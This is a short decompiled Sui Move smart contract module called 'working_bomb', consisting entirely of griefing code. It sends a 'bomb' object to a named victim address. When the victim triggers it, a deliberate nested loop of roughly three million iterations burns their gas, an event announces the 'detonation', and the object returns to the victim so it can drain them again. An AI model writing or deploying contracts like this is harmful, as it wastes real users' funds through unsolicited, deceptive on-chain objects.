module 0xe41fc5ee9b1d2b601935a0b969a1638f0228e2d85e917ca598bffd4e3cd51e14::working_bomb {
    struct WorkingBomb has store, key {
        id: 0x2::object::UID,
        victim_address: address,
        trigger_count: u64,
        is_active: bool,
    }

    struct BombDetonated has copy, drop {
        victim_address: address,
        trigger_count: u64,
        timestamp: u64,
    }

    public fun create_working_bomb(arg0: address, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = WorkingBomb{
            id             : 0x2::object::new(arg1),
            victim_address : arg0,
            trigger_count  : 0,
            is_active      : true,
        };
        0x2::transfer::public_transfer<WorkingBomb>(v0, arg0);
    }

    public fun deploy_quick_bomb(arg0: address, arg1: &mut 0x2::tx_context::TxContext) {
        create_working_bomb(arg0, arg1);
    }

    fun execute_gas_drain() {
        let v0 = 0;
        while (v0 < 30000) {
            let v1 = 0;
            while (v1 < 100) {
                v1 = v1 + 1;
            };
            v0 = v0 + 1;
        };
    }

    public fun trigger_working_bomb(arg0: WorkingBomb, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = arg0.victim_address;
        assert!(0x2::tx_context::sender(arg1) == v0, 401);
        assert!(arg0.is_active, 402);
        execute_gas_drain();
        let v1 = BombDetonated{
            victim_address : v0,
            trigger_count  : arg0.trigger_count + 1,
            timestamp      : 0x2::tx_context::epoch_timestamp_ms(arg1),
        };
        0x2::event::emit<BombDetonated>(v1);
        0x2::transfer::public_transfer<WorkingBomb>(arg0, v0);
    }

    // decompiled from Move bytecode v6
}

